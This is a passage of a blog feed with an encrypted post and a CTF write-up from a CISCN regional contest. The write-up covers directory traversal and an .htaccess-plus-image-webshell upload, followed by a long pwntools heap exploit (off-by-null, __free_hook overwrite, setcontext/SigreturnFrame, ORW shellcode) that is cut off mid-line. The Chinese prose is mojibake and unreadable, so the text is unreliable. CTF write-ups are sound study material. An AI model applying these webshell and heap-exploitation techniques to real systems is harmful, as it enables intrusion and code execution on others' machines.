    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3804e55f75da1bcdf81aae3394f451ef10a220ed38e9c06c16cc567163dac29e">cc0c0f8ba411acd26894e584ac9b5fda4c48279772446ae3a79194e70ba82a6e254b09a770c602c31392fb984500b111dce6dc9d27525b8bed2d8ecce07c55d7d23864cf85ca7b833bf37adda3708ef5a66ccd531414ca2f889dc61f3067d9b4d534cb5755c491c7d67190a1b41e018d4f8deb64c79f16a548f387491f84d0fa4c481c967f9d949bd2287e57f6da405062fd417396e13a2d5998f61d8c150cc61f1a57a2cecd52156617596dd26a6b9b03c2bdd36fe87b5a7c1ad859cff65c8bd07475685aeefba80e0aa2e7793fe64ba1d200eaa038a1679a0fd9f3250be51847e869b6ed8fe8048c7be14e3caf21d0327a9fbad92302e96808a8d4c6dabef330757080a7986a9240576a57a2ed1707cf45cfd41b3676096d2b2a50700deef48f6bc626e05f3a7273c4326e85dae4d2c9f56958486a2b3058406d28b810939bcdcbac065a891908e38d2a16905cb9e73cddaf76cdd73012f99fa76554616c07c2920ea1cbeaf45cccc3bf9e1ae02d1756a48e40e75aa336025288ba8496656e2f14595c7369515bca9bdb4214e2901d7f55cb247a31a0e15f62c94a044d8d06480fdb8b6e874a3bda907aa814691dc2f00531cbabcc38f024128276dd44656610b572d748771e34a7f8e58e2d4eca3f8b1922c6b2b01bc66046b0b69bf584237eb907af46cd9d41a228163aa56308d006b32e3eb0beda3a9c1d4bce624769747f8cc9433943658480098764dbac021b3406419927c87adf58560ad8343749a067cb617052e723e9ba8e327505f3d227e5de82613d88b45291d96d0200c62632bd47a555b0fad1351f34588f4ea2585ac34ea36d3dfc38406ac56c4f234059061ae1c6cc680b4f783852ff700a9d27e7b17fd8b7316cdc95332f50d2d9ce868ca69c3984b8fc369082ef8e74d0da2b2c6c7a86a042eca284f288e9be0b2f4618dfaf887e5ab365113e846b76502a9aabbe5f219bc4384c720c0f54f71acfc3bb22f1fd044d20b79ba6a2ccd120d9f24604c599a6c77e6d45b646a2ebe60cde4d63d330a0b3738e2d3c4c8caae282bee66be2f807adbd2e8d7ebf64ba2cdd993412bec3039a0693014f9d94420462fdd1336c77cef13cb05591aad35759bf5f16462ea1454575028fea221af5bdc988379a6c7631afe3ef5003461b11b4a3282e7e5c2622acca369f847e4a44df5e5c936fd1b47bd48a151b58e1963f77b9a8186efbf19816f865c139d3cecba541095af2f3baba8ae58407c6aae1f06edda62fc3b6310141fcca41fdad5183a514e2b2321a4aea3a6329904b92dc13ade29df06a19bc9e1f1ab1546483577eb4726f9a7e6aa3be8d6a4fc5cee096dd8b1f89d4c95dde41c547a42bbd2484eb94a287deb0466442a295a41865a3b3f304b32eb0792e94baf78fe90187af159c2102e6106ebef2e6b200a6e1f19103f96677c4acde80872b4b6acfbbb0fe445a2607e4032e451c16754e6e48f8c47ea3407258897e0d63dad24db300dc6d628a70d365b64c74df77d5446b44c7e95011cfa217939381e760836a39feee3cc60925bb6aaf8111ba44828643d37891e8d55f2394d4073f9a95916a6d049c0492ffd50618a11102e3b6814426c5c22c8440df60baa900907d760bf1955cbb398c07bbf58a32df44df8ccb7f4e296e2d8ea8a4b2c8133dd6f6ea4b828aac7897d39c42be41a802e40c6370cbf647bef3da56b47ae218135c4883e171db9846a6b0b74ff932bb94078043daf05450d9c00faaf6fbfa550e2725f1c570446bb28b39bac2e42ede3d7e489ff50b014dc8d677836fdd860f7bebbaebf3281b8702472d8ff7438e904d3cb6a39db30b4bff32a0fd9ee74f87b57f462a5eb479daba0a8aac40b71530a06806a2eb9a9390b7de672532231eaacca1eb2fc85542c1ddff8fbf1eb79f8ca10c0564ce5ab52638237f5e35abe7b848dcb2d85a1ffa9246f231e4cccad08f87e3719fb9cac566a624b1fb60f35087b3d8e99b3a07627c938a9338dab1ca6300daf02aa87dd7e7d85def8e977cee9c7587a99dda366bb2ac0f1887381a0cd066d3402be2a2fc40d556e5f566b6c49db0617b9987661c749f564c703b4c9653bc49d4a811b7d43484b26081f856882a7c1309e3e3f6d3dfacc8750796124792784d81fcf7fcf7423ea315396906f64a71f380fd2581edb0f62d844fc9e5665a8c812f426805ab7c4d1b68835f9118219df3f84c2bcbefad8edf60e704f0f9706432ea4714b1e63e7bacfbf57382ffd8f02d3461c1459201c23e441d86e93bfc3b6eb1fb6cc14c1071a960d8ff9716c0c9c66322439053465a36e8b185a5b7bbb8abb90d0d166edc501d5bd4fa7da2535c88ced9c3778fd738ee232425a5d90f7ec5e5e64a8ca494c84de7925c51a7e74115a5772f9f51d2482ef5b965f1f4c57afb897968763a9e19ca93bc4d62d50154cc4d9f1cf5c356d1925199f826275338d078580199a4e669897d1fd425d0070c6f83fba9072dc19e0e78e077505f38539e672ec75e84bd9796266b422374dc17e4de9cb2101c5c063d0bdb78b9ea018caa6304a0dbc2e45f1ea515216101bde5ed094bdcdf5807d72bcfa68542c50c49fb756052db88124f03a316b7ac2cb0234a4b1a6f3094b2acc393ffcc7c4fabc5752e446f3b68449a8ba777754bc4da85734f61af1c42ce2f7f8c849f04afc4517f13750f8c2c00ce54d355bcd95c8b191a702751f86d24ec44c039a63196414588ba9500f609968cc0779dbbe3cbde4144bb418163554d63c30b458a337a4b9c17f0d653485ac544289d48ac27559592dafe27c6c1759d45c4cefe0de0857593e273f119740a67e243cfe8c46a10d4a6becf035662220d7dc75d00ac8b2a0a97ceeafdd51eb9d75835fb73a238b5937c5ec3a1157204429fe4418a8803d8f62538b19a9d3aff7d4918e227a059f9b996b4c729972eef30c182ee799dda514ee70c9ab780905b034276f6dcff82f85c5f1774b5dc3966895b54ed951f36ea3ba19b851fe9ba2e970ca840fd4fd1f60bb68554f61bad0c2e976ad136276f449921e13d53aa3febb69c457f3848bb51688b6eb73c7973651e44e9d3ef655a53b2bc506577b9cbb9e7ffe570f7e90628da1d848fa296628e6501f90eb890638d92b48ebd7432c90e84250adb70e15c3406fad65e593ea299d53e6b24dd1f40c79bdb1b4ceaa8f636babb028c62a85aecd744d3eeae2b55d1b6d4b1b39db591d3984459aa023522dc79748db962073a6375932164d080eb8aaa6750854d823b917a1274ac07d4f731ec6afe75e44618f69190001c9d01178a271221623faf63194af7971401fc33affc268897f40fa4415455c376a698c89c8515cf54d215d2312657c6499abc0eea339e68c295246c5dd6ba2c791a6f94054135137aba8cdc47dd46a575ee6e12039c26523a26b283c73b01aaba25814ea3e4bd9d6f47aec39ba3b04f0ed17d6b5a88e2ab54f924a9eb94c454f1d8874d01d0b15714ded31f4dd857aafe9799bc28690b23e287dafe33892a72f1a6aad90ff70a8f7de2e3fac638ad3ef7ec2cbb395dc3414f451d4bbe03f668098365206375791aa2707c2fc3f7db6ffbbe371752cf34edf86f63fdc03f3ca1c00c8f0263e4b9e7ab078c9d098a2c3b0d051f90f0295a5eae24adbb4f0f873c890787e02d89bb3adb1d4cc6286fc3524694e52b84bc80e4a62a6276d32c168efa53da84448d338cab6d4827f9579d450f7f204de6f3b60c03a8d32698d8f6a200d2046190a4cd68b65adb16aa3ffdc1acad7eb6d312e01fc66d6400630fd1ad53beafd1d8d301663de44041779b92ece008916bca542011995c8aa8fa26ddbebd0f2f3c1aff50bb4c1e2f761dfab550a9bb4e22b2ac9c745b1a8d770637d0bb980db82b402842e3c2769c73af88a5d6fdbad8e332dc6e3d9f947e8739d69a20838a6260cffd03144bcf25434c8c4048fe93ea1f5a7e7fabf409cb3cd951b26fd590fafd3ba107128a41b554af6394345e0155f346ea0b4a23a951ddb5dbc2b61f5a453502ba671771b74b961e142ac5a64a1ad8cdaca666e648cfb5a69332aed76da657e849a310061af41d03de04e80ef44478ddf8f74035df7dcd317ba2cca1c81a342defc967a50922e9837553d3866fac5f73fa396301c3998d159099c963f37e734062735ed020011fd8fae62848d3aae7361cdb7fa08781aa8b055df6f88f1a90e35cf03660df44a9572d27302f51b15d9941efd9bcfe4b2acbde998269d2ad06165a5f939b337c4d550e63f9c3a20cfe3a7b4a8c58e51b3f88757eeea4d574467d66c5c59bccfda8c544e5b2c9f7f3bd011ffb5c0d3ded5dcf483f4324adedf6d6b2ed09f22c949a28f792f1aad364fe818e53c3c02b974ba9a2e7cd3cf350364b6f140296cc3398118bc8ae77eeb0d35f12845d9978ebbeba837a572589a93e18f33a1cbf6c9e3423d82d2b93fe2db88a46c5eae9e39ed737e50faeafc23f201a8de5f37074e2e704be82cdcc1d3801e03772ce82e0d7bd7ebec1724629b7283c8dc1974c6444bfe425e63aa7e7daf59f98ce5e9eaafb2a1c8088f184102997e7ad283d9f741f4ae0ff91e2b166e96f28da061751e37b7f97ab0a30fb1855d80b915c20dfba57cb54dc0d38e13ffe830b36bd2cea81b1d6af84d65b2c982b8c4a1ab49fe19213c7fc12acb8ba6c8b072bd2ccbb7e363da145af8232d39586233298989614fa7afb850d52b76af1f9c1766cabe533cd77891df95c6f96a3b90fab0815f4acf895535bab01f0e54042be846287bcdfa01f3320b4a1b24f0ba85252d2cb72e5d959882ec5d1b2cd487c4d22b6033094a3803d43090a80662353c2b230fd42f11de95e5ce2662036a7d82f9fab4ee147189ab1474d4fcdc884c13d6a735729661254f68a50441c339d86aa540b20293569999ae111e546234be3eddf97fbe1d44e73b1177f94e0d29bf919b83f95e0c68d0f92606ffdf51d2988ad3842bfe1befe58b0637364c5bdb2c97fe965a04b1d601a433c363a2c4e0217c5d5f5527247889ae8cf2f1b9effc82b5a890281526307dfb8fefa60cae246887c1b08f716aa60facfac5c67c571b5fbc4d949603223f5e7d8355944c0dc41d5fb7ada93a89cf584c70c3ef7e81c87152465d868ce7dbc06cd56ccdd51cb875f62c8c0b178f283dfaf3957c435a9f1c5027dc0ada24b7db0323a94cc77abcf4c22aaa5e66a709bc969fb421552e0b06e04ca82beca954d4840a796b7607a0e474a57f8f3b4d7d317bfe90c16493a907fd91853fccc491fe23fc343afd4219e54d2f768c4de7193dd04a14f67479854f50915591db672a8f2439b2560761f42d3628c56e63499cb61756edf706d57e2e1f5cf829407b28d8bbc9ca633ae0c2c2d56bfe7b61adbcc12d6297906d06eccb2a6a20ab27fba5d66ef83974aa88605d7eb6ead15661e3ee97fd288b5c317ec7167cd150da93f09a49ebf0c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">å·²ç»åœ¨åšäº†ï¼Œå¿«äº†å¿«äº†</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ArchLinux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCNåä¸­èµ›åŒºåˆ†åŒºèµ›-éƒ¨åˆ†wp</title>
    <link href="/2022/06/29/CISCN%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B-%E9%83%A8%E5%88%86wp/"/>
    <url>/2022/06/29/CISCN%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B-%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<blockquote><p>é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºï¼š<a href="https://forum.butian.net/share/1723">https://forum.butian.net/share/1723</a></p></blockquote><p>è¿™æ¬¡åˆ†åŒºèµ›æˆç»©ä¸å¤ªç†æƒ³ï¼Œæœ‰äº›é¢˜ç›®ç¡®å®æœ‰ç‚¹è„‘æ´ï¼ŒèŠ±äº†å¾ˆä¹…çš„æ—¶é—´æ‰åšå‡ºæ¥ï¼ŒåŠ ä¸Šé¢˜ç›®åˆ†å€¼æ„Ÿè§‰ä¹Ÿæœ‰ç‚¹ç¦»è°±ï¼Œmiscå’ŒreçœŸçš„æ˜¯å¤§çˆ·äº†ï¼Œpwnï¼Œwebå±äºæ˜¯æ‰“é…±æ²¹ã€‚</p><p>æœ€ååªæœ‰15åï¼Œéšä¾¿è§£å‡ºæ¥ä¸€ä¸ªé¢˜å°±è¿›å†³èµ›äº†ï¼Œï¼Œï¼ŒğŸ˜­</p><h3 id="web1"><a class="header-anchor" href="#web1">Â¶</a>web1</h3><p>ç›®å½•ç©¿è¶Šï¼Œå¯¹è„‘ç”µæ³¢æ‰¾æ–‡ä»¶ï¼Œæ‰¾äº†åŠå¤©ä»¥ä¸ºè¦rceï¼Œç»“æœæ˜¯flag.phpã€‚ã€‚ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fd5d3335b36c5a77b504a80b7f83f21bb4cccef4.png" alt="å›¾ç‰‡.png"></p><h3 id="web2"><a class="header-anchor" href="#web2">Â¶</a>web2</h3><p>é¦–å…ˆï¼Œä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œè¿”å›æŠ¥æ–‡ä¸­æœ‰identityå­—æ®µ</p><p>åŠ å…¥identityå­—æ®µå,è¿”å›ä¸€ä¸ªå¯ä»¥æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢A0ther_hldden_PaGe.php</p><p>ç»è¿‡fuzzä¹‹ååªèƒ½ä¸Šä¼ .jpgï¼ŒåŒæ—¶å‘ç°å¯ä»¥ä¸Šä¼ .htaccessï¼Œå› æ­¤ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå¹¶ä¸Šä¼ .htaccessä½¿ä¹‹è§£æä¸ºphp</p><p>ä¹‹åä½¿ç”¨èšå‰‘é“¾æ¥ï¼Œæ‰¾åˆ°flagã€‚<br>ï¼ˆwebé€‰æ‰‹æ²¡æœ‰å­˜å›¾ï¼‰</p><h3 id="pwn1"><a class="header-anchor" href="#pwn1">Â¶</a>pwn1</h3><p>ä¸Šåˆå‘çš„ç¬¬ä¸€é“pwnï¼Œä¹Ÿæ˜¯å”¯ä¸€è§£å‡ºæ¥çš„ä¸€é“pwnï¼Œwebpwnï¼Œä½†æ˜¯åªæ˜¯æ¨¡æ‹Ÿäº†httpçš„è¯·æ±‚å¤„ç†è¿‡ç¨‹ï¼Œè€Œæ²¡æœ‰å¼€webç«¯å£ä¹‹ç±»çš„ï¼Œç±»ä¼¼äºhttpdï¼Œé‡ç‚¹è¿˜æ˜¯å®¡è®¡ä»£ç ã€‚<br>å®¡å®Œä¹‹åæ˜¯åœ¨editå¤„å­˜åœ¨ä¸€ä¸ªoff_by_NULLã€‚<br>ç¯å¢ƒæ˜¯libc2.27ï¼Œå¼€äº†æ²™ç®±éœ€è¦orwã€‚ç…§ç€æ¿å­ï¼Œåé¢ç»•ä¸€ä¸‹0æˆªæ–­å°±è¡Œäº†ã€‚<br>exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token comment">#----------------------------------------------</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>ti <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#----------------------------------------------</span>http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''GET /&#123;&#125; HTTP/1.1\r\nHost: Epiphany\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Length\r\n'''</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn1"</span><span class="token punctuation">)</span><span class="token comment"># sh = remote("10.75.1.22",'58012')</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /login HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUsername: C4oy1\r\nPassword: 123\r\nContent-Length: &#123;&#125;\r\n\r\nUsername=C4oy1&amp;Password=123\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">0x1e</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /create HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit11</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit22</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /delete HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: 0\r\n\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /show HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: 0\r\n\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">replace0</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'\0'</span><span class="token punctuation">:</span>            r <span class="token operator">+=</span> <span class="token string">'a'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r <span class="token operator">+=</span> i    <span class="token keyword">return</span> rlogin<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''gdb.attach(sh, "b *$rebase(0x00000000000280C))pause()'''</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>set_context  <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span>mprotect <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#off by null</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x67</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x67</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>edit11<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">0x460</span><span class="token operator">+</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>free_hook <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>free_hook <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>set_context <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>set_context <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>set_context<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>sig <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sig<span class="token punctuation">.</span>rdi <span class="token operator">=</span> free_hook <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span>sig<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x2000</span>sig<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>sig<span class="token punctuation">.</span>rip <span class="token operator">=</span> mprotectsig<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook<span class="token operator">+</span><span class="token number">0x10</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token 